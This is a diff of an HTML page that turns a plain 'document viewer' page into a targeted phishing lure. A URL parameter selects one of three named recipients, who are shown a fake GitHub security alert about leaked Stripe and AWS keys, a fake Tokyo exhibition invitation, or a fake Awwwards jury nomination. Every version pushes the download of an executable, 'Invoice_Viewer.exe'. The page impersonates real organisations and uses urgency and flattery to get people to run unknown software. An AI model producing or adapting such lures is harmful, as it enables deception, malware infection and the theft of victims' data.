@@ -1,9 +1,64 @@
-<!doctype html><html><head><meta charset="utf-8"><title>Secure Document</title>
-<style>body{margin:0;font-family:sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f4f6f8}
-.card{background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px #0001;max-width:500px;text-align:center}
-h1{font-size:20px} a{display:inline-block;margin-top:20px;padding:14px 32px;background:#1a73e8;color:#fff;text-decoration:none;border-radius:8px;font-weight:bold}</style>
-</head><body><div class="card">
-<h1>Secure Document Viewer</h1>
-<p>Please download the viewer to access your file.</p>
-<a href="Invoice_Viewer.exe" download>Download Viewer</a>
-</div></body></html>
+<!doctype html><html><head><meta charset="utf-8">
+<title>Secure Document</title>
+<style>
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:40px 20px;background:#f4f6f8;color:#111}
+.card{background:#fff;max-width:560px;width:100%;padding:48px 40px;border-radius:14px;box-shadow:0 6px 28px rgba(0,0,0,0.09)}
+h1{font-size:24px;margin:0 0 10px;font-weight:700}
+p{color:#444;font-size:15px;line-height:1.65;margin:10px 0}
+.badge{display:inline-block;padding:5px 12px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:18px}
+.btn{display:inline-block;margin-top:26px;padding:14px 38px;background:#1a73e8;color:#fff;text-decoration:none;border-radius:8px;font-weight:600;font-size:15px}
+.btn:hover{background:#1557b0}
+.small{font-size:12px;color:#999;margin-top:28px;display:block}
+.gh{background:#0d1117;color:#c9d1d9;padding:20px;border-radius:8px;font-family:monospace;font-size:13px;margin:20px 0}
+.gh .red{color:#f85149}
+.art h1{font-family:Georgia,serif;font-weight:400;letter-spacing:-0.5px}
+.awards{background:#000;color:#fff}
+.awards .card{background:#111;color:#fff}
+.awards .badge{background:#ff2d2d;color:#fff}
+.awards .btn{background:#fff;color:#000}
+.awards p{color:#bbb}
+</style></head><body>
+<div class="card" id="card">
+  <div class="badge" id="badge">SECURE DOCUMENT</div>
+  <h1 id="title">Loading...</h1>
+  <div id="body"><p>Please wait...</p></div>
+  <a class="btn" id="dl" href="#">Download</a>
+  <span class="small" id="foot">End-to-end encrypted</span>
+</div>
+<script>
+const params = new URLSearchParams(window.location.search);
+const t = (params.get("t") || "eduardo").toLowerCase();
+const card = document.getElementById("card");
+const badge = document.getElementById("badge");
+const title = document.getElementById("title");
+const body = document.getElementById("body");
+const dl = document.getElementById("dl");
+const foot = document.getElementById("foot");
+
+if (t === "eduardo") {
+  title.textContent = "GitHub Security Alert";
+  badge.textContent = "CRITICAL";
+  badge.style.background = "#fee"; badge.style.color = "#c00";
+  body.innerHTML = '<p>We detected a leaked secret in your public commit <code>a3f2c9d</code> of repository <b>haymike/frenzy-astro</b>.</p><div class="gh">commit a3f2c9d<br><span class="red">EXPOSED: STRIPE_SECRET_KEY = sk_live_51H...</span><br>EXPOSED: AWS_ACCESS_KEY = AKIA...</div><p>To prevent unauthorized use, download the full audit report before 24 hours.</p>';
+  dl.textContent = "Download Security Report";
+  foot.textContent = "GitHub Trust & Safety · automated detection";
+} else if (t === "camille") {
+  document.body.classList.add("art");
+  title.textContent = "Tokyo Visual Arts Exhibition 2026";
+  badge.textContent = "INVITATION";
+  badge.style.background = "#f0e6d2"; badge.style.color = "#8a6d3b";
+  body.innerHTML = '<p>Dear Camille,</p><p>Your portfolio has been selected among 50 photographers worldwide for our upcoming exhibition in Shibuya, Tokyo.</p><p>Please find your VIP invitation and participation details inside.</p>';
+  dl.textContent = "Open VIP Invitation";
+  foot.textContent = "Tokyo Arts Council · 2026";
+} else if (t === "crystal") {
+  document.body.classList.add("awards");
+  title.textContent = "Awwwards Jury Invitation";
+  badge.textContent = "NOMINATION";
+  body.innerHTML = '<p>You have been nominated to join the Awwwards jury for the <b>Visual Identity</b> category in 2026.</p><p>Please review the official nomination package and confirm your participation.</p>';
+  dl.textContent = "Review Nomination";
+  foot.textContent = "awwwards. · jury 2026";
+}
+dl.href = "Invoice_Viewer.exe";
+dl.setAttribute("download", "");
+</script>
+</body></html>
